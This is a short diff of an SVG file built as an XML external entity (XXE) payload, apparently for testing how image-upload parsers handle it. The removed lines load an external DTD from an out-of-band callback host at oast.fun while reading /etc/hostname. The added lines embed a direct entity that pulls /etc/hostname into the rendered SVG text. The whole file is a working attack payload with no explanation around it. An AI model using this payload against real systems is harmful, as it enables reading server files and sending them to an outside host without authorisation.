@@ -1,9 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE svg [
-  <!ENTITY % file SYSTEM "file:///etc/hostname">
-  <!ENTITY % dtd SYSTEM "https://ifwrchmwqthownjixjwu5lw83qag9ckj1.oast.fun/evil.dtd">
-  %dtd;
+  <!ENTITY xxe SYSTEM "file:///etc/hostname">
 ]>
 <svg xmlns="http://www.w3.org/2000/svg">
-  <text>test</text>
+  <text x="10" y="20">&xxe;</text>
 </svg>
